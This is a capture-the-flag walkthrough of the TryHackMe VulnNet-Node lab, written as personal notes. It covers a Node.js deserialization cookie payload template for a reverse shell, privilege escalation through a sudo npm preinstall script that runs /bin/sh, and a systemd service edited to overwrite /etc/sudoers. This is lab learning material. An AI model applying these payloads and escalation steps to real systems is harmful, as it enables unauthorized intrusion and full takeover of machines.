---
title: Walkthrough - VulnNET-Node
published: true
---

Tags: Linux, Web, Javascript, Privilege Escalation, NPM.
Description: After the previous breach, VulnNet Entertainment states it won't happen again. Can you prove they're wrong?
Difficulty: Easy
URL: [https://tryhackme.com/room/vulnnetnode](https://tryhackme.com/room/vulnnetnode)

* * *

## Notes

The name and Nmap gives us the clue this is a nodejs vuln

```
PORT     STATE SERVICE VERSION
8080/tcp open  http    Node.js Express framework
|_http-title: VulnNet &ndash; Your reliable news source &ndash; Try Now!
```

- `gobuster dir -u http://10.10.136.21:8080/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 100`

Gobuster doesnt yeild much just shows us the login that we can find by visiting the website.

Checking the firefox inspector, the session cookie seems to base64.

![0xskar](/assets/vulnnet-node01.png)

```
┌──(0xskar㉿cocokali)-[~/Documents/TryHackMe/VulnNet-Node]
└─$ echo "eyJ1c2VybmFtZSI6Ikd1ZXN0IiwiaXNHdWVzdCI6dHJ1ZSwiZW5jb2RpbmciOiAidXRmLTgifQ==" | base64 -d
{"username":"Guest","isGuest":true,"encoding": "utf-8"}           
```

Perhaps we are able to edit this cookie to give us access?

- encode `{"username":"Admin","isAdmin":true,"encoding": "utf-8"}` - `eyJ1c2VybmFtZSI6IkFkbWluIiwiaXNBZG1pbiI6dHJ1ZSwiZW5jb2RpbmciOiAidXRmLTgifQ==`

Doesnt seem to do anything...

Going to use [nodejsshell.py](https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py) to create a nodejs shell for our machine.

I have used this from the past to work with nodejs `_$$ND_FUNC$$_function(){codehere}()` and then modifying the code from [here](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/) and encodeing with base64 gets the server to send us a reverse shell.

```
{"rce":"_$$ND_FUNC$$_function(){eval(CODEHERE)}()"}
```

Encode to b64 and send through as the cookie to gain shell

```
efaults entries for www on vulnnet-node:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www may run the following commands on vulnnet-node:
    (serv-manage) NOPASSWD: /usr/bin/npm
```

Using this we can privesc to serv-manage

- `echo '{"scripts": {"preinstall": "/bin/sh"}}' > exp/package.json`
- `sudo -u serv-manage npm -C /home/www/VulnNet-Node/exp/ --unsafe-perm i`

* * * 

## user.txt?

![0xskar](/assets/vulnnet-node02.png)

* * * 

## root.txt?

sudo -l shows us we can start and stop a service names vulnnet-auto.timer

```
User serv-manage may run the following commands on vulnnet-node:
    (root) NOPASSWD: /bin/systemctl start vulnnet-auto.timer
    (root) NOPASSWD: /bin/systemctl stop vulnnet-auto.timer
    (root) NOPASSWD: /bin/systemctl daemon-reload
```

We have permissions so we can edit this file to send us another reverse shell.

- `find / -name vulnnet* 2>/dev/null`
- `cat /etc/systemd/system/vulnnet-job.service`

This file executes df we have permissions to edit however so we can edit to give us root perms.

```
[Unit]
Description=Logs system statistics to the systemd journal
Wants=vulnnet-auto.timer

[Service]
# Gather system statistics
Type=forking
ExecStart=/bin/sh -c 'echo "serv-manage ALL=(root) NOPASSWD: ALL" > /etc/sudoers'

[Install]
WantedBy=multi-user.target
```

Then we can swap to root and cat root.txt

```
(remote) serv-manage@vulnnet-node:/etc/systemd/system$ sudo /bin/systemctl stop vulnnet-auto.timer
(remote) serv-manage@vulnnet-node:/etc/systemd/system$ sudo /bin/systemctl daemon-reload
(remote) serv-manage@vulnnet-node:/etc/systemd/system$ sudo /bin/systemctl start vulnnet-auto.timer
(remote) serv-manage@vulnnet-node:/etc/systemd/system$ sudo -l
User serv-manage may run the following commands on vulnnet-node:
    (root) NOPASSWD: ALL
(remote) serv-manage@vulnnet-node:/etc/systemd/system$ cat /root/root.txt
cat: /root/root.txt: Permission denied
(remote) serv-manage@vulnnet-node:/etc/systemd/system$ sudo su
root@vulnnet-node:/etc/systemd/system# cat /root/root.txt
```

* * * 

